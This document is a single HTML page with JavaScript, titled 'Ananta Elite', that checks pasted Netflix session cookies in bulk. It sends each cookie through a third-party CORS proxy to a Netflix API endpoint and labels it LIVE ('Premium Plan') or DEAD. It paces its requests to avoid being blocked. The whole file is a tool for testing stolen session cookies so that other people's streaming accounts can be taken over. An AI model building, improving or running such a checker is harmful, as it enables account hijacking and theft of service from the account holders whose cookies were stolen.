<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ananta Elite - Workable Scanner</title>
    <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #050505;
            --panel: rgba(15, 15, 15, 0.9);
            --accent: #E50914;
            --green: #00FF88;
            --border: rgba(255, 255, 255, 0.1);
        }

        body {
            background-color: var(--bg);
            color: white;
            font-family: 'Syne', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .main-container {
            width: 95%;
            max-width: 1000px;
            background: var(--panel);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: 30px;
            padding: 40px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }

        .header h1 { color: var(--accent); font-size: 2.5rem; text-align: center; margin-bottom: 30px; }

        /* Stats Bar */
        .stats { display: flex; gap: 20px; margin-bottom: 25px; }
        .stat-item { flex: 1; background: rgba(255,255,255,0.03); padding: 20px; border-radius: 15px; border: 1px solid var(--border); text-align: center; }
        .stat-item span { display: block; font-size: 0.7rem; color: #666; margin-bottom: 5px; }
        .stat-item b { font-size: 1.8rem; font-family: 'JetBrains Mono'; }

        /* Input */
        textarea {
            width: 100%; height: 180px; background: #000; border: 1px solid var(--border);
            border-radius: 15px; padding: 20px; color: var(--green); font-family: 'JetBrains Mono';
            resize: none; outline: none; transition: 0.3s; margin-bottom: 20px;
        }
        textarea:focus { border-color: var(--accent); }

        /* Play Button */
        .play-btn {
            display: block; width: 100%; padding: 18px; background: var(--accent);
            color: white; border: none; border-radius: 12px; font-weight: 800;
            cursor: pointer; text-transform: uppercase; transition: 0.3s;
        }
        .play-btn:hover { background: #b20710; transform: translateY(-2px); }

        /* Result Table */
        .results { margin-top: 30px; max-height: 250px; overflow-y: auto; border-radius: 15px; border: 1px solid var(--border); }
        table { width: 100%; border-collapse: collapse; font-family: 'JetBrains Mono'; font-size: 0.8rem; }
        th { background: rgba(255,255,255,0.05); padding: 12px; text-align: left; color: #555; }
        td { padding: 12px; border-top: 1px solid var(--border); }
        .live { color: var(--green); font-weight: bold; }
        .dead { color: var(--accent); }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="header"><h1>ANANTA ELITE</h1></div>

        <div class="stats">
            <div class="stat-item"><span>TOTAL</span><b id="t-count">0</b></div>
            <div class="stat-item"><span>LIVE</span><b id="l-count" style="color:var(--green)">0</b></div>
            <div class="stat-item"><span>DEAD</span><b id="d-count" style="color:var(--accent)">0</b></div>
        </div>

        <textarea id="cookie-data" placeholder="Paste Netflix Cookies (Netscape or JSON format)..."></textarea>
        
        <button class="play-btn" id="start-trigger" onclick="runChecker()">Start Validation</button>

        <div class="results">
            <table>
                <thead><tr><th>Cookie ID</th><th>Status</th><th>Note</th></tr></thead>
                <tbody id="log-list"></tbody>
            </table>
        </div>
    </div>

<script>
    let hit = 0, dead = 0;

    // Helper to parse different cookie formats into a usable header string
    function parseToHeader(raw) {
        if (raw.includes('[') && raw.includes('{')) { // JSON Format
            try {
                const json = JSON.parse(raw);
                return json.map(c => `${c.name}=${c.value}`).join('; ');
            } catch(e) { return null; }
        }
        if (raw.includes('\t')) { // Netscape Format
            return raw.split('\n')
                .filter(line => line.trim() && !line.startsWith('#'))
                .map(line => {
                    const parts = line.split('\t');
                    return parts.length >= 7 ? `${parts[5]}=${parts[6]}` : null;
                })
                .filter(x => x).join('; ');
        }
        return raw.trim(); // Assume raw string
    }

    async function runChecker() {
        const input = document.getElementById('cookie-data').value.trim();
        if(!input) return alert("Please provide data.");

        // Split by double newline or distinct cookie blocks
        const blocks = input.split(/\n\s*\n/); 
        document.getElementById('t-count').innerText = blocks.length;
        document.getElementById('start-trigger').disabled = true;
        document.getElementById('start-trigger').innerText = "Checking...";

        for(let i=0; i<blocks.length; i++) {
            const cookieString = parseToHeader(blocks[i]);
            if(!cookieString) continue;

            const isLive = await validate(cookieString);
            
            if(isLive) hit++; else dead++;

            const row = `<tr>
                <td>Asset_${i+1}</td>
                <td class="${isLive ? 'live' : 'dead'}">${isLive ? 'LIVE' : 'DEAD'}</td>
                <td>${isLive ? 'Premium Plan' : 'Expired/Invalid'}</td>
            </tr>`;

            document.getElementById('log-list').insertAdjacentHTML('afterbegin', row);
            document.getElementById('l-count').innerText = hit;
            document.getElementById('d-count').innerText = dead;
            
            // Short delay to prevent being blocked
            await new Promise(r => setTimeout(r, 1000));
        }

        document.getElementById('start-trigger').disabled = false;
        document.getElementById('start-trigger').innerText = "Scan Finished";
    }

    async function validate(cookies) {
        // We use a CORS Proxy and a real Netflix verification endpoint
        const proxy = "https://corsproxy.io/?"; 
        const url = "https://www.netflix.com/api/shakti/v8e2c07d3/pathEvaluator";

        try {
            const res = await fetch(proxy + encodeURIComponent(url), {
                method: "GET",
                headers: { "Cookie": cookies }
            });
            
            // Logic: If the cookie is valid, the API responds with 200 and JSON.
            // If invalid, Netflix redirects or gives a 401.
            return res.ok && res.status !== 401;
        } catch(err) {
            return false;
        }
    }
</script>
</body>
</html>
